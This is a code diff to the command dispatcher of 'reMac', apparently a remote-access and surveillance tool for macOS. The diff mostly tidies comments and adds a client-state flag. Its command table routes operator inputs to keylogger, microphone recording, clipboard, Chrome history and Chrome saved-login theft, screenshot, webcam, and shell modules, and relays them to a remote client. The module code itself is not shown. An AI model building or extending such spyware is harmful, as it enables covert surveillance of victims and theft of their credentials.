@@ -1,5 +1,4 @@
-import sys, getopt
-import os
+import sys
 
 from apps import reMac_server
 from apps import reMac_client
@@ -30,7 +29,8 @@ reMacModules = {
     'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module', 'kl'],
     'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm <seconds to record>'],
     'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>'],
-    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in']
+    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in']#,
+    #'in': [mod_info.mod_info(), 'info', 'Call info module', 'in']
 }
 
 authorName = "JeteDonner"
@@ -65,6 +65,9 @@ def print_help():
     print(f'#========================================================================#')
 
 
+#global clientStarted
+clientStarted = False
+
 def processInput(input):
 
     # if clientStarted == True:
@@ -82,62 +85,57 @@ def processInput(input):
                 myreMac_client.start_client(inp_args[1], inp_args[2])
                 return
 
-
-    if input == "q":# or input == "quit":
+    if input == "q":
         sys.exit(1)
-    elif input == "h":# or input == "help":
+    elif input == "h":
         print_help()
-    elif input == "hw":  # or input == "help":
+    elif input == "hw":
         reMacModules[input][0].run_mod()
-    elif input == "s":# or input == "help":
+    elif input == "s":
         myreMac_server.start_server()
-    elif input == "hh":  # or input == "help":
+    elif input == "hh":
         print_client_help()
-    elif input == "c":# or input == "help":
+    elif input == "c":
         myreMac_client.start_client()
         global clientStarted
         clientStarted = True
-        # myreMac_client.start_client("mh")
-    elif input == "kl":# or input == "help":
+    elif input == "kl":
         reMacModules[input][0].run_mod()
-    elif input == "cb":# or input == "clipboard":
+    elif input == "cb":
         if clientStarted == True:
             myreMac_client.send2_client("cb")
         else:
             reMacModules[input][0].run_mod()
-    elif input == "ch":# or input == "chromeHistory":
+    elif input == "ch":
         if clientStarted == True:
             myreMac_client.send2_client(input)
         else:
             reMacModules[input][0].run_mod()
-    elif input == "in":# or input == "chromeHistory":
+    elif input == "in":
         if clientStarted == True:
             myreMac_client.send2_client(input)
         else:
             reMacModules[input][0].run_mod()
-    elif input == "cl":# or input == "chromeLogins":
+    elif input == "cl":
         reMacModules[input][0].run_mod()
-    elif input == "sh":# or input == "shell":
+    elif input == "sh":
         reMacModules[input][0].run_mod()
-    elif input == "sc":# or input == "screenshot":
-        # reMacModules[input][0].run_mod()
+    elif input == "sc":
         if clientStarted == True:
             myreMac_client.send2_client(input)
-            pass
         else:
             reMacModules[input][0].run_mod()
-    elif input == "wc":# or input == "screenshot":
+    elif input == "wc":
         if clientStarted == True:
             myreMac_client.send2_client(input)
-            pass
         else:
             reMacModules[input][0].run_mod()
-    elif input == "rm":  # or input == "screenshot":
+    elif input == "rm":
         if clientStarted == True:
             myreMac_client.send2_client(input)
         else:
             reMacModules["mh"][0].print_client_help(appName, reMacModules, input)
-    elif input.startswith("mh"):  # or input == "screenshot":
+    elif input.startswith("mh"):
         if clientStarted == True:
             myreMac_client.send2_client(input)
         else:
@@ -154,7 +152,6 @@ def enterWaitForInput(argv):
         processInput(c.lower())
 
 if __name__ == "__main__":
-    # print(f'Number of arguments:', len(sys.argv), 'arguments.')
     if len(sys.argv) == 1:
         print_help()
         enterWaitForInput(sys.argv)
